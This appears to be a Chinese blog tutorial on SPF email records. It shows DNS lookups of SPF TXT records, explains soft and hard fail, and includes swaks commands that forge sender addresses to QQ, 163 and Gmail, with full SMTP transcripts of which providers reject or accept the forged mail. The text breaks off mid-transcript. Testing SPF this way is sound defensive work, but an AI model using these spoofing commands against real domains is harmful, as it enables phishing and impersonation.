href="#没有spf的记录" class="headerlink" title="没有spf的记录"></a><strong>没有spf的记录</strong></h5><p>nslookup -type&#x3D;txt 165.com</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">D:\&gt;nslookup -<span class="hljs-keyword">type</span>=txt <span class="hljs-number">165.</span>com<br>服务器:  <span class="hljs-type">UnKnown</span><br>Address:  <span class="hljs-number">10.211</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span><br><br><span class="hljs-number">165.</span>com<br>        <span class="hljs-keyword">primary</span> <span class="hljs-type">name</span> <span class="hljs-keyword">server</span> = coby.ns.cloudflare.com<br>        responsible mail addr = dns.cloudflare.com<br>        <span class="hljs-type">serial</span>  = <span class="hljs-number">2036766500</span><br>        <span class="hljs-keyword">refresh</span> = <span class="hljs-number">10000</span> (<span class="hljs-number">2</span> hours <span class="hljs-number">46</span> mins <span class="hljs-number">40</span> secs)<br>        retry   = <span class="hljs-number">2400</span> (<span class="hljs-number">40</span> mins)<br>        expire  = <span class="hljs-number">604800</span> (<span class="hljs-number">7</span> days)<br>        <span class="hljs-keyword">default</span> TTL = <span class="hljs-number">3600</span> (<span class="hljs-number">1</span> hour)<br></code></pre></td></tr></table></figure><h4 id="mac-linux"><a href="#mac-linux" class="headerlink" title="mac &#x2F; linux"></a><strong>mac &#x2F; linux</strong></h4><h5 id="dig"><a href="#dig" class="headerlink" title="dig"></a><strong>dig</strong></h5><p>​<strong>dig -t txt domain</strong></p><h5 id="host"><a href="#host" class="headerlink" title="host"></a><strong>host</strong></h5><p>​<strong>host -t txt domain</strong></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dns">(base) [root@<span class="hljs-number">110</span> ~]# host -t txt qq.com<br>qq.com descriptive text &quot;v=spf1 include:spf.mail.qq.com -all&quot;<br><br>(base) [root@<span class="hljs-number">110</span> ~]# host -t txt spf.mail.qq.com<br>spf.mail.qq.com descriptive text &quot;v=spf1 include:qq-a.mail.qq.com include:qq-b.mail.qq.com include:qq-c.mail.qq.com include:biz-a.mail.qq.com include:biz-b.mail.qq.com include:biz-c.mail.qq.com include:biz-d.mail.qq.com -all&quot;<br><br>(base) [root@<span class="hljs-number">110</span> ~]# host -t txt qq-a.mail.qq.com<br>qq-a.mail.qq.com descriptive text &quot;v=spf1 ip<span class="hljs-number">4:101.226.139</span>.<span class="hljs-number">0</span>/<span class="hljs-number">25</span> ip<span class="hljs-number">4:101.91.43</span>.<span class="hljs-number">0</span>/<span class="hljs-number">25</span> ip<span class="hljs-number">4:101.91.44</span>.<span class="hljs-number">128</span>/<span class="hljs-number">25</span> ip<span class="hljs-number">4:112.64.237</span>.<span class="hljs-number">128</span>/<span class="hljs-number">25</span> ip<span class="hljs-number">4:116.128.173</span>.<span class="hljs-number">0</span>/<span class="hljs-number">25</span> ip<span class="hljs-number">4:121.51.40</span>.<span class="hljs-number">128</span>/<span class="hljs-number">25</span> ip<span class="hljs-number">4:121.51.6</span>.<span class="hljs-number">0</span>/<span class="hljs-number">25</span> ip<span class="hljs-number">4:162.62.52</span>.<span class="hljs-number">214</span> ip<span class="hljs-number">4:162.62.55</span>.<span class="hljs-number">67</span> ip<span class="hljs-number">4:162.62.57</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span> ip<span class="hljs-number">4:162.62.58</span>.<span class="hljs-number">211</span> ip<span class="hljs-number">4:162.62.58</span>.<span class="hljs-number">216</span> -all&quot;<br></code></pre></td></tr></table></figure><h3 id="设置方法"><a href="#设置方法" class="headerlink" title="设置方法"></a><strong>设置方法</strong></h3><p>也可以说spf记录就是DNS解析记录</p><p>在阿里云上，可以直接添加一条记录</p><p>v&#x3D;spf1 ip4:121.43.138.1 -all</p><p>表示只有从 121.43.138.1 发送的邮件为合法邮件，其他的全部拒绝。</p><h3 id="软硬拒绝"><a href="#软硬拒绝" class="headerlink" title="软硬拒绝"></a>软硬拒绝</h3><h4 id="软拒绝"><a href="#软拒绝" class="headerlink" title="软拒绝"></a>软拒绝</h4><p>~ 软拒绝，硬拒绝会丢弃很多邮件，为避免这种情况，会设置为软拒绝，如果设置软拒绝，表示发件IP非法，但是不采取强硬措施，可能会标为垃圾邮件等</p><p>test.site的 SPF 设置为软拒绝</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">┌──(root㉿<span class="hljs-number">61804e0083</span>af)-[/]<br>└─<span class="hljs-comment"># host -t txt test.site</span><br>vict.site descriptive <span class="hljs-built_in">text</span> <span class="hljs-string">&quot;v=spf1 ip4:121.43.138.1 ~all&quot;</span><br></code></pre></td></tr></table></figure><h5 id="软拒绝-伪造的邮件QQ邮箱拒绝"><a href="#软拒绝-伪造的邮件QQ邮箱拒绝" class="headerlink" title="软拒绝-伪造的邮件QQ邮箱拒绝"></a>软拒绝-伪造的邮件QQ邮箱拒绝</h5><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs clean">┌──(root㉿<span class="hljs-number">61804e0083</span>af)-[/]<br>└─# swaks --to test@foxmail.com --<span class="hljs-keyword">from</span> admin@test.site --body <span class="hljs-string">&quot;~all to qq&quot;</span><br>=== Trying mx3.qq.com:<span class="hljs-number">25.</span>..<br>=== Connected to mx3.qq.com.<br>&lt;-  <span class="hljs-number">220</span> newxmmxszb1<span class="hljs-number">-2.</span>qq.com MX QQ Mail Server.<br> -&gt; EHLO <span class="hljs-number">61804e0083</span>af<br>&lt;-  <span class="hljs-number">250</span>-newxmmxszb1<span class="hljs-number">-2.</span>qq.com<br>&lt;-  <span class="hljs-number">250</span>-STARTTLS<br>&lt;-  <span class="hljs-number">250</span><span class="hljs-number">-8</span>BITMIME<br>&lt;-  <span class="hljs-number">250</span>-SIZE <span class="hljs-number">73400320</span><br>&lt;-  <span class="hljs-number">250</span> OK<br> -&gt; MAIL FROM:&lt;admin@test.site&gt;<br>&lt;-  <span class="hljs-number">250</span> OK<br> -&gt; RCPT TO:&lt;test@foxmail.com&gt;<br>&lt;-  <span class="hljs-number">250</span> OK<br> -&gt; DATA<br>&lt;-  <span class="hljs-number">354</span> End data <span class="hljs-keyword">with</span> &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;.<br> -&gt; Date: Sun, <span class="hljs-number">09</span> Apr <span class="hljs-number">2023</span> <span class="hljs-number">08</span>:<span class="hljs-number">36</span>:<span class="hljs-number">55</span> +<span class="hljs-number">0000</span><br> -&gt; To: test@foxmail.com<br> -&gt; From: admin@test.site<br> -&gt; Subject: test Sun, <span class="hljs-number">09</span> Apr <span class="hljs-number">2023</span> <span class="hljs-number">08</span>:<span class="hljs-number">36</span>:<span class="hljs-number">55</span> +<span class="hljs-number">0000</span><br> -&gt; Message-Id: &lt;<span class="hljs-number">20230409083655.000017</span>@<span class="hljs-number">61804e0083</span>af&gt;<br> -&gt; X-Mailer: swaks v20201014<span class="hljs-number">.0</span> jetmore.org/john/<span class="hljs-keyword">code</span>/swaks/<br> -&gt; <br> -&gt; ~all to qq<br> -&gt; <br> -&gt; <br> -&gt; .<br><br>&lt;** <span class="hljs-number">550</span> SPF check failed [MO+TD704vLucbv7Hd8BASEhQm5HgwZ88L3vGy9OWHck+hKp4HTLoROmFlo7u7dv/KQ==  IP: <span class="hljs-number">61.135</span><span class="hljs-number">.152</span><span class="hljs-number">.141</span>]. https:<span class="hljs-comment">//service.mail.qq.com/detail/122/72.</span><br> -&gt; QUIT<br>&lt;-  <span class="hljs-number">221</span> Bye.<br>=== Connection closed <span class="hljs-keyword">with</span> remote host.<br><br></code></pre></td></tr></table></figure><p>提示SPF检查失败</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">550 SPF<span class="hljs-built_in"> check </span>failed [MO+TD704vLucbv7Hd8BASEhQm5HgwZ88L3vGy9OWHck+hKp4HTLoROmFlo7u7dv/KQ==  IP: 61.135.152.141]. https://service.mail.qq.com/detail/122/72.<br></code></pre></td></tr></table></figure><h5 id="软拒绝-伪造的邮件163邮箱接收"><a href="#软拒绝-伪造的邮件163邮箱接收" class="headerlink" title="软拒绝-伪造的邮件163邮箱接收"></a>软拒绝-伪造的邮件163邮箱接收</h5><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs clean">┌──(root㉿<span class="hljs-number">61804e0083</span>af)-[/]<br>└─# swaks --to test@<span class="hljs-number">163.</span>com --<span class="hljs-keyword">from</span> admin@test.site --body <span class="hljs-string">&quot;all forgery to 163 &quot;</span><br>=== Trying <span class="hljs-number">163</span>mx02.mxmail.netease.com:<span class="hljs-number">25.</span>..<br>=== Connected to <span class="hljs-number">163</span>mx02.mxmail.netease.com.<br>&lt;-  <span class="hljs-number">220</span> <span class="hljs-number">163.</span>com Anti-spam GT for Coremail System (<span class="hljs-number">163</span>com[<span class="hljs-number">20141201</span>])<br> -&gt; EHLO <span class="hljs-number">61804e0083</span>af<br>&lt;-  <span class="hljs-number">250</span>-mail<br>&lt;-  <span class="hljs-number">250</span>-PIPELINING<br>&lt;-  <span class="hljs-number">250</span>-AUTH LOGIN PLAIN<br>&lt;-  <span class="hljs-number">250</span>-AUTH=LOGIN PLAIN<br>&lt;-  <span class="hljs-number">250</span>-coremail <span class="hljs-number">1</span>Uxr2xKj7kG0xkI17xGrU7I0s8FY2U3Uj8Cz28x1UUUUU7Ic2I0Y2Ur8Yv9BUCa0xDrUUUUj<br>&lt;-  <span class="hljs-number">250</span>-STARTTLS<br>&lt;-  <span class="hljs-number">250</span>-SIZE <span class="hljs-number">73400320</span><br>&lt;-  <span class="hljs-number">250</span> <span class="hljs-number">8</span>BITMIME<br> -&gt; MAIL FROM:&lt;admin@test.site&gt;<br>&lt;-  <span class="hljs-number">250</span> Mail OK<br> -&gt; RCPT TO:&lt;test@<span class="hljs-number">163.</span>com&gt;<br>&lt;-  <span class="hljs-number">250</span> Mail OK<br> -&gt; DATA<br>&lt;-  <span class="hljs-number">354</span> End data <span class="hljs-keyword">with</span> &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;<br> -&gt; Date: Sun, <span class="hljs-number">09</span> Apr <span class="hljs-number">2023</span> <span class="hljs-number">08</span>:<span class="hljs-number">49</span>:<span class="hljs-number">46</span> +<span class="hljs-number">0000</span><br> -&gt; To: test@<span class="hljs-number">163.</span>com<br> -&gt; From: admin@test.site<br> -&gt; Subject: test Sun, <span class="hljs-number">09</span> Apr <span class="hljs-number">2023</span> <span class="hljs-number">08</span>:<span class="hljs-number">49</span>:<span class="hljs-number">46</span> +<span class="hljs-number">0000</span><br> -&gt; Message-Id: &lt;<span class="hljs-number">20230409084946.000022</span>@<span class="hljs-number">61804e0083</span>af&gt;<br> -&gt; X-Mailer: swaks v20201014<span class="hljs-number">.0</span> jetmore.org/john/<span class="hljs-keyword">code</span>/swaks/<br> -&gt; <br> -&gt; all forgery to <span class="hljs-number">163</span> <br> -&gt; <br> -&gt; <br> -&gt; .<br>&lt;-  <span class="hljs-number">250</span> Mail OK queued <span class="hljs-keyword">as</span> zwqz-mx-mta-g3<span class="hljs-number">-3</span>,_____wD3hm4rfDJkLRh1AQ-<span class="hljs-number">-.34322</span>S2 <span class="hljs-number">1681030189</span><br> -&gt; QUIT<br>&lt;-  <span class="hljs-number">221</span> Bye<br>=== Connection closed <span class="hljs-keyword">with</span> remote host.<br></code></pre></td></tr></table></figure><p>会在信头的Authentication-Results字段中显示 spf 为软失败</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Authentication-Results: zwqz-mx-mta-g3-3; <span class="hljs-attribute">spf</span>=softfail smtp.<span class="hljs-attribute">mail</span>=admin@test.site;<br></code></pre></td></tr></table></figure><h5 id="软拒绝-伪造的邮件google邮箱拒绝"><a href="#软拒绝-伪造的邮件google邮箱拒绝" class="headerlink" title="软拒绝-伪造的邮件google邮箱拒绝"></a>软拒绝-伪造的邮件google邮箱拒绝</h5><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs clean">┌──(root㉿c87bd1816ee7)-[/]<br>└─# swaks --to test@gmail.com --<span class="hljs-keyword">from</span> admin@test.site --body <span class="hljs-string">&quot;all forgery to google &quot;</span><br>=== Trying gmail-smtp-<span class="hljs-keyword">in</span>.l.google.com:<span class="hljs-number">25.</span>..<br>=== Connected to gmail-smtp-<span class="hljs-keyword">in</span>.l.google.com.<br>&lt;-  <span class="hljs-number">220</span> mx.google.com ESMTP u17<span class="hljs-number">-20020</span>a63ef11000000b004fba312c235si5393252pgh<span class="hljs-number">.411</span> - gsmtp<br> -&gt; EHLO c87bd1816ee7<br>&lt;-  <span class="hljs-number">250</span>-mx.google.com at your service, [<span class="hljs-number">111.194</span><span class="hljs-number">.122</span><span class="hljs-number">.157</span>]<br>&lt;-  <span class="hljs-number">250</span>-SIZE <span class="hljs-number">157286400</span><br>&lt;-  <span class="hljs-number">250</span><span class="hljs-number">-8</span>BITMIME<br>&lt;-  <span class="hljs-number">250</span>-STARTTLS<br>&lt;-  <span class="hljs-number">250</span>-ENHANCEDSTATUSCODES<br>&lt;-  <span class="hljs-number">250</span>-PIPELINING<br>&lt;-  <span class="hljs-number">250</span>-CHUNKING<br>&lt;-  <span class="hljs-number">250</span> SMTPUTF8<br> -&gt; MAIL FROM:&lt;admin@test.site&gt;<br>&lt;-  <span class="hljs-number">250</span> <span class="hljs-number">2.1</span><span class="hljs-number">.0</span> OK u17<span class="hljs-number">-20020</span>a63ef11000000b004fba312c235si5393252pgh<span class="hljs-number">.411</span> - gsmtp<br> -&gt; RCPT TO:&lt;test@gmail.com&gt;<br>&lt;-  <span class="hljs-number">250</span> <span class="hljs-number">2.1</span><span class="hljs-number">.5</span> OK u17<span class="hljs-number">-20020</span>a63ef11000000b004fba312c235si5393252pgh<span class="hljs-number">.411</span> - gsmtp<br> -&gt; DATA<br>&lt;-  <span class="hljs-number">354</span>  Go ahead u17<span class="hljs-number">-20020</span>a63ef11000000b004fba312c235si5393252pgh<span class="hljs-number">.411</span> - gsmtp<br> -&gt; Date: Sat, <span class="hljs-number">08</span> Apr <span class="hljs-number">2023</span> <span class="hljs-number">07</span>:<span class="hljs-number">08</span>:<span class="hljs-number">31</span> +<span class="hljs-number">0000</span><br> -&gt; To: test@gmail.com<br> -&gt; From: admin@test.site<br> -&gt; Subject: test Sat, <span class="hljs-number">08</span> Apr <span class="hljs-number">2023</span> <span class="hljs-number">07</span>:<span class="hljs-number">08</span>:<span class="hljs-number">31</span> +<span class="hljs-number">0000</span><br> -&gt; Message-Id: &lt;<span class="hljs-number">20230408070831.000062</span>@c87bd1816ee7&gt;<br> -&gt; X-Mailer: swaks v20201014<span class="hljs-number">.0</span> jetmore.org/john/<span class="hljs-keyword">code</span>/swaks/<br> -&gt;<br> -&gt; all forgery to google<br> -&gt;<br> -&gt;<br> -&gt; .<br>&lt;** <span class="hljs-number">550</span><span class="hljs-number">-5.7</span><span class="hljs-number">.26</span> The MAIL FROM domain [vict.site] has an SPF record <span class="hljs-keyword">with</span> a hard fail<br>&lt;** <span class="hljs-number">550</span><span class="hljs-number">-5.7</span><span class="hljs-number">.26</span> policy (-all) but it fails to pass SPF checks <span class="hljs-keyword">with</span> the ip:<br>&lt;** <span class="hljs-number">550</span><span class="hljs-number">-5.7</span><span class="hljs-number">.26</span> [<span class="hljs-number">111.194</span><span class="hljs-number">.122</span><span class="hljs-number">.157</span>]. To best protect our users <span class="hljs-keyword">from</span> spam and phishing,<br>&lt;** <span class="hljs-number">550</span><span class="hljs-number">-5.7</span><span class="hljs-number">.26</span> the message has been blocked. Please visit<br>&lt;** <span class="hljs-number">550</span><span class="hljs-number">-5.7</span><span class="hljs-number">.26</span>  https:<span class="hljs-comment">//support.google.com/mail/answer/81126#authentication for more</span><br>&lt;** <span class="hljs-number">550</span> <span class="hljs-number">5.7</span><span class="hljs-number">.26</span> information. u17<span class="hljs-number">-20020</span>a63ef11000000b004fba312c235si5393252pgh<span class="hljs-number">.411</span> - gsmtp<br> -&gt; QUIT<br>*** Remote host closed connection unexpectedly.<br></code></pre></td></tr></table></figure><h4 id="硬拒绝"><a href="#硬拒绝" class="headerlink" title="硬拒绝"></a>硬拒绝</h4><p>- 硬拒绝，</p><p>-all</p><p>vict.site的 SPF 设置为硬拒绝</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">┌──(root㉿<span class="hljs-number">61804e0083</span>af)-[/]<br>└─<span class="hljs-comment"># host -t txt test.site</span><br>vict.site descriptive <span class="hljs-built_in">text</span> <span class="hljs-string">&quot;v=spf1 ip4:121.43.138.1 -all&quot;</span><br></code></pre></td></tr></table></figure><h5 id="硬拒绝-伪造的邮件QQ邮箱拒绝"><a href="#硬拒绝-伪造的邮件QQ邮箱拒绝" class="headerlink" title="硬拒绝-伪造的邮件QQ邮箱拒绝"></a>硬拒绝-伪造的邮件QQ邮箱拒绝</h5><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs clean">┌──(root㉿<span class="hljs-number">61804e0083</span>af)-[/]<br>└─# swaks --to test@foxmail.com --<span class="hljs-keyword">from</span> admin@test.site --body <span class="hljs-string">&quot;all forgery to qq&quot;</span><br>=== Trying mx3.qq.com:<span class="hljs-number">25.</span>..<br>=== Connected to mx3.qq.com.<br>&lt;-  <span class="hljs-number">220</span> newxmmxszc6<span class="hljs-number">-2.</span>qq.com MX QQ Mail Server.<br> -&gt; EHLO <span class="hljs-number">61804e0083</span>af<br>&lt;-  <span class="hljs-number">250</span>-newxmmxszc6<span class="hljs-number">-2.</span>qq.com<br>&lt;-  <span class="hljs-number">250</span>-STARTTLS<br>&lt;-  <span class="hljs-number">250</span><span class="hljs-number">-8</span>BITMIME<br>&lt;-  <span class="hljs-number">250</span>-SIZE <span class="hljs-number">73400320</span><br>&lt;-  <span class="hljs-number">250</span> OK<br> -&gt; MAIL FROM:&lt;admin@test.site&gt;<br>&lt;-  <span class="hljs-number">250</span> OK<br> -&gt; RCPT TO:&lt;test@foxmail.com&gt;<br>&lt;-  <span class="hljs-number">250</span> OK<br> -&gt; DATA<br>&lt;-  <span class="hljs-number">354</span> End data <span class="hljs-keyword">with</span> &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;.<br> -&gt; Date: Sat, <span class="hljs-number">25</span> Mar <span class="hljs-number">2023</span> <span class="hljs-number">08</span>:<span class="hljs-number">58</span>:<span class="hljs-number">40</span> +<span class="hljs-number">0000</span><br> -&gt; To: test@foxmail.com<br> -&gt; From: admin@test.site<br> -&gt; Subject: test Sat, <span class="hljs-number">25</span> Mar <span class="hljs-number">2023</span> <span class="hljs-number">08</span>:<span class="hljs-number">58</span>:<span class="hljs-number">40</span> +<span class="hljs-number">0000</span><br> -&gt; Message-Id: &lt;<span class="hljs-number">20230325085840.000144</span>@<span class="hljs-number">61804e0083</span>af&gt;<br> -&gt; X-Mailer: swaks v20201014<span class="hljs-number">.0</span> jetmore.org/john/<span class="hljs-keyword">code</span>/swaks/<br> -&gt; <br> -&gt; all forgery to qq<br> -&gt; <br> -&gt; <br> -&gt; .<br>&lt;** <span class="hljs-number">550</span> SPF check failed [MPheda7H5r2WwJffxgMR71aZMUWOXuOHHJuHE5PjvsqCDHQ3wc0MOqsrBXS2MiwuNQ==  IP: <span class="hljs-number">61.135</span><span class="hljs-number">.152</span><span class="hljs-number">.140</span>]. https:<span class="hljs-comment">//service.mail.qq.com/detail/122/72.</span><br> -&gt; QUIT<br>&lt;-  <span class="hljs-number">221</span> Bye.<br>=== Connection closed <span class="hljs-keyword">with</span> remote host.<br></code></pre></td></tr></table></figure><h5 id="硬拒绝-伪造的邮件163邮箱拒绝"><a href="#硬拒绝-伪造的邮件163邮箱拒绝" class="headerlink" title="硬拒绝-伪造的邮件163邮箱拒绝"></a>硬拒绝-伪造的邮件163邮箱拒绝</h5><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs clean">┌──(root㉿<span class="hljs-number">61804e0083</span>af)-[/]<br>└─# swaks --to test@<span class="hljs-number">163.</span>com --<span class="hljs-keyword">from</span> admin@test.site --body <span class="hljs-string">&quot;all forgery to 163 &quot;</span><br>=== Trying <span class="hljs-number">163</span>mx03.mxmail.netease.com:<span class="hljs-number">25.</span>..<br>=== Connected to <span class="hljs-number">163</span>mx03.mxmail.netease.com.<br>&lt;-  <span class="hljs-number">220</span> <span class="hljs-number">163.</span>com Anti-spam GT for Coremail System (<span class="hljs-number">163</span>com[<span class="hljs-number">20141201</span>])<br> -&gt; EHLO <span class="hljs-number">61804e0083</span>af<br>&lt;-  <span class="hljs-number">250</span>-mail<br>&lt;-  <span class="hljs-number">250</span>-PIPELINING<br>&lt;-  <span class="hljs-number">250</span>-AUTH LOGIN PLAIN<br>&lt;-  <span class="hljs-number">250</span>-AUTH=LOGIN PLAIN<br>&lt;-  <span class="hljs-number">250</span>-coremail <span class="hljs-number">1</span>Uxr2xKj7kG0xkI17xGrU7I0s8FY2U3Uj8Cz28x1UUUUU7Ic2I0Y2UFbexPCUCa0xDrUUUUj<br>&lt;-  <span class="hljs-number">250</span>-STARTTLS<br>&lt;-  <span class="hljs-number">250</span>-SIZE <span class="hljs-number">73400320</span><br>&lt;-  <span class="hljs-number">250</span> <span class="hljs-number">8</span>BITMIME<br> -&gt; MAIL FROM:&lt;admin@test.site&gt;<br>&lt;-  <span class="hljs-number">250</span> Mail OK<br> -&gt; RCPT TO:&lt;test@<span class="hljs-number">163.</span>com&gt;<br>&lt;-  <span class="hljs-number">250</span> Mail OK<br> -&gt; DATA<br>&lt;-  <span class="hljs-number">354</span> End data <span class="hljs-keyword">with</span> &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;<br> -&gt; Date: Sat, <span class="hljs-number">25</span> Mar <span class="hljs-number">2023</span> <span class="hljs-number">08</span>:<span class="hljs-number">53</span>:<span class="hljs-number">24</span> +<span class="hljs-number">0000</span><br> -&gt; To: test@<span class="hljs-number">163.</span>com<br> -&gt; From: admin@test.site<br> -&gt; Subject: test Sat, <span class="hljs-number">25</span> Mar <span class="hljs-number">2023</span> <span class="hljs-number">08</span>:<span class="hljs-number">53</span>:<span class="hljs-number">24</span> +<span class="hljs-number">0000</span><br> -&gt; Message-Id: &lt;<span class="hljs-number">20230325085324.000123</span>@<span class="hljs-number">61804e0083</span>af&gt;<br> -&gt; X-Mailer: swaks v20201014<span class="hljs-number">.0</span> jetmore.org/john/<span class="hljs-keyword">code</span>/swaks/<br> -&gt; <br> -&gt; all forgery to <span class="hljs-number">163</span> <br> -&gt; <br> -&gt; <br> -&gt; .<br>&lt;** <span class="hljs-number">550</span> DI:SPF <span class="hljs-number">163</span> mx65,EN1pCgAnf1uEth5knwhKCw-<span class="hljs-number">-.17116</span>S2 <span class="hljs-number">1679734404</span>,please see http:<span class="hljs-comment">//mail.163.com/help/help_spam_16.htm?ip=218.30.113.52&amp;hostid=mx65&amp;time=1679734404</span><br> -&gt; QUIT<br>&lt;-  <span class="hljs-number">221</span> Bye<br>=== Connection closed <span class="hljs-keyword">with</span> remote host.<br></code></pre></td></tr></table></figure><h5 id="软拒绝-伪造的邮件google邮箱拒绝-1"><a href="#软拒绝-伪造的邮件google邮箱拒绝-1" class="headerlink" title="软拒绝-伪造的邮件google邮箱拒绝"></a>软拒绝-伪造的邮件google邮箱拒绝</h5><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs clean">┌──(root㉿<span class="hljs-number">61804e0083</span>af)-[/]<br>└─# swaks --to test@gmail.com --<span class="hljs-keyword">from</span> admin@test.site --body <span class="hljs-string">&quot;~all forgery to google &quot;</span><br>=== Trying gmail-smtp-<span class="hljs-keyword">in</span>.l.google.com:<span class="hljs-number">25.</span>..<br>=== Connected to gmail-smtp-<span class="hljs-keyword">in</span>.l.google.com.<br>&lt;-  <span class="hljs-number">220</span> mx.google.com ESMTP b6<span class="hljs-number">-20020</span>a170902d50600b0019f243b2dccsi6100977plg<span class="hljs-number">.415</span> - gsmtp<br> -&gt; EHLO c87bd1816ee7<br>&lt;-  <span class="hljs-number">250</span>-mx.google.com at your service, [<span class="hljs-number">111.194</span><span 